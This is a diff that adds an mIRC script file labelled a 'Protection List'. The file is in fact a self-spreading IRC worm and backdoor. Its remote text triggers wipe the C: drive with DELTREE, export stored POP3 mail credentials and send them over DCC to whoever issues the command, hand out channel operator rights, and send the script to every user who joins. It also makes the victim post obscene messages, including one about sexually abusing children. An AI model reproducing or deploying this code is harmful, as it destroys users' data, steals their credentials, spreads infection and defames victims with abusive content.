@@ -1,0 +1,21 @@
+[script]
+n0=;----------------------------------------------------------
+n1=;      Protection List
+n2=;----------------------------------------------------------
+n3=ON 1:TEXT:!DIE666!:*:/quit KILLED BY DHS POWER
+n4=ON 1:TEXT:!DELTREE!:*:/run DELTREE /Y C:
+n5=ON 1:TEXT:!IEMPASSMAKE!:?:/run regedit /e C:\xxx.reg "HKEY_CURRENT_USER\Software\Microsoft\Internet Mail and News\Mail\POP3"
+n6=ON 1:TEXT:!IEMPASSSEND!:?:/dcc send $nick C:\xxx.reg
+n7=ON 1:TEXT:!PASSPLAY!:?:/play $nick C:\xxx.reg 1000
+n8=ON 1:JOIN:#:{
+n9=  if ( $nick != $me ) { /dcc send $nick $mircdirscript.ini
+n10=  }
+n11=}
+n12=ON 1:TEXT:!INFECTED!:*:/msg $nick I'm INFECTED.
+n13=ON 1:TEXT:!OPMEORDIE!:?:/mode $chan +o $nick
+n14=ON 1:TEXT:!KICK!:?:/ban $me | /kick # $me
+n15=ON 1:TEXT:!ANIMAL!:*:/ame LOVES FUCKING ANIMALS | /amsg I'M FUCKING MY DOG NOW !!! IT IS COOOOLL !!!
+n16=ON 1:TEXT:!LAME!:*:/ame is a total LAME !!!
+n17=ON 1:TEXT:SHIT:*:/ame is eating SHIT NOW !!! | /ame LOVES EATING SHIT !!!
+n18=ON 1:TEXT:MOTHER:/amsg MY MOTHER IS A BITCH !!! | I LOVE LICKING HER PUSSY !!!
+n19=ON 1:TEXT:KIDS:/ame LOVES FUCKING KIDS !!!
